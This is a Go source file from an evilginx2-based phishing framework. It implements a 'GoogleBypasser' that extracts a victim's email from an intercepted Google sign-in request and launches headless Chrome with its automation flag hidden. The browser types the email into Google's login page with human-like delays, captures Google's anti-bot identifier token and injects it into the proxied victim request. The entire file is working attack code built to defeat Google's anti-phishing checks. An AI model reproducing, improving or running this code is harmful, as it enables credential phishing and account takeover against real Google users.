package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

// ============================================================================
// SIMPLIFIED GOOGLE BYPASSER - Based on proven working ProfGinx-V8
//
// Key characteristics:
// - Simple, synchronous design
// - Fresh browser instance per request (no global state)
// - Direct go-rod launcher (handles Chrome lifecycle)
// - No caching, no warm pools, no async complexity
// - Proven to work reliably
//
// This replaces the complex async implementation that was causing hangs
// ============================================================================

type GoogleBypasser struct {
	browser        *rod.Browser
	page           *rod.Page
	isHeadless     bool
	withDevTools   bool
	slowMotionTime time.Duration
	token          string
	email          string
}

var bgRegexp = regexp.MustCompile(`identity-signin-identifier\\",\\"([^"]+)`)

// NewGoogleBypasser creates a new bypasser instance
func NewGoogleBypasser(headless bool) *GoogleBypasser {
	return &GoogleBypasser{
		isHeadless:   headless,
		withDevTools: false,
	}
}

// Launch starts a fresh Chrome instance using go-rod launcher
// This is simple and reliable - go-rod handles all Chrome lifecycle management
func (b *GoogleBypasser) Launch() {
	log.Info("[GoogleBypasser] Launching fresh browser instance...")

	l := launcher.New().
		Headless(b.isHeadless).
		Devtools(b.withDevTools).
		Set("disable-blink-features", "AutomationControlled").
		Set("disable-infobars", "").
		Set("window-size", "1920,1080")

	// Run as root if needed (for Docker containers)
	if os.Geteuid() == 0 {
		l = l.NoSandbox(true)
	}

	wsURL := l.MustLaunch()
	b.browser = rod.New().ControlURL(wsURL)

	if b.slowMotionTime > 0 {
		b.browser = b.browser.SlowMotion(b.slowMotionTime)
	}

	b.browser = b.browser.MustConnect()
	b.page = b.browser.MustPage()

	log.Info("[GoogleBypasser] Browser launched successfully")
}

// Close cleans up the browser instance
func (b *GoogleBypasser) Close() {
	if b.browser != nil {
		b.browser.MustClose()
		log.Debug("[GoogleBypasser] Browser closed")
	}
}

// GetEmail extracts the email from the request body
func (b *GoogleBypasser) GetEmail(body []byte) {
	exp := regexp.MustCompile(`f\.req=\[\[\["MI613e","\[null,\\"(.*?)\\"`)
	emailMatch := exp.FindSubmatch(body)
	if len(emailMatch) < 2 {
		log.Error("[GoogleBypasser] Could not extract email from request")
		return
	}
	b.email = string(bytes.Replace(emailMatch[1], []byte("%40"), []byte("@"), -1))
	log.Info("[GoogleBypasser] Extracted email: %s", b.email)
}

// GetToken performs the full flow: navigate -> enter email -> capture token
// This is synchronous and reliable
func (b *GoogleBypasser) GetToken() {
	stop := make(chan struct{})
	var once sync.Once
	timeout := time.After(45 * time.Second)

	// Set up network listener to capture the MI613e request with the token
	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		if strings.Contains(e.Request.URL, "/signin/_/AccountsSignInUi/data/batchexecute?") &&
			strings.Contains(e.Request.URL, "rpcids=MI613e") {
			decodedBody, err := url.QueryUnescape(string(e.Request.PostData))
			if err != nil {
				log.Error("[GoogleBypasser] Failed to decode body: %v", err)
				return
			}
			b.token = bgRegexp.FindString(decodedBody)
			if b.token != "" {
				log.Info("[GoogleBypasser] Captured token: %s...", b.token[:min(50, len(b.token))])
				once.Do(func() { close(stop) })
			}
		}
	})()

	log.Info("[GoogleBypasser] Navigating to Google login...")
	if err := b.page.Navigate("https://accounts.google.com/"); err != nil {
		log.Error("[GoogleBypasser] Navigation failed: %v", err)
		return
	}

	// Human-like delay after page load (500-1500ms)
	time.Sleep(time.Duration(500+rand.Intn(1000)) * time.Millisecond)

	log.Info("[GoogleBypasser] Waiting for email field...")
	emailField := b.page.MustWaitLoad().MustElement("#identifierId")

	// Human-like delay before typing (200-600ms)
	time.Sleep(time.Duration(200+rand.Intn(400)) * time.Millisecond)

	if err := emailField.Input(b.email); err != nil {
		log.Error("[GoogleBypasser] Failed to input email: %v", err)
		return
	}
	log.Info("[GoogleBypasser] Entered email: %s", b.email)

	// Human-like delay before pressing Enter (300-800ms)
	time.Sleep(time.Duration(300+rand.Intn(500)) * time.Millisecond)

	if err := b.page.Keyboard.Press(input.Enter); err != nil {
		log.Error("[GoogleBypasser] Failed to press Enter: %v", err)
		return
	}
	log.Info("[GoogleBypasser] Submitted form, waiting for token...")

	select {
	case <-stop:
		log.Success("[GoogleBypasser] ✅ Token obtained successfully")
	case <-timeout:
		log.Error("[GoogleBypasser] ⏱️ Timeout waiting for token (45s)")
	}
}

// ReplaceTokenInBody replaces the token in the request body
func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
	if b.token == "" {
		log.Warning("[GoogleBypasser] No token available for replacement")
		return body
	}
	newBody := bgRegexp.ReplaceAllString(string(body), b.token)
	log.Debug("[GoogleBypasser] Token replaced in body")
	return []byte(newBody)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ============================================================================
// Helper function for kasada_bypasser compatibility
// ============================================================================

func getWebSocketDebuggerURL() (string, error) {
	resp, err := http.Get("http://127.0.0.1:9222/json")
	if err != nil {
		return "", fmt.Errorf("Chrome not running on port 9222: %v", err)
	}
	defer resp.Body.Close()

	var targets []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
		return "", err
	}

	if len(targets) == 0 {
		return "", fmt.Errorf("no targets found")
	}

	ws, ok := targets[0]["webSocketDebuggerUrl"].(string)
	if !ok || ws == "" {
		return "", fmt.Errorf("webSocketDebuggerUrl not found")
	}

	return ws, nil
}

// ============================================================================
// REMOVED COMPLEX FEATURES:
// - Global browser instance management
// - Token caching with TTL
// - Warm page pools
// - Async token generation
// - PreGenerateToken function
//
// These added complexity and failure points without proper synchronization.
// The simple synchronous approach is proven to work reliably.
// ============================================================================
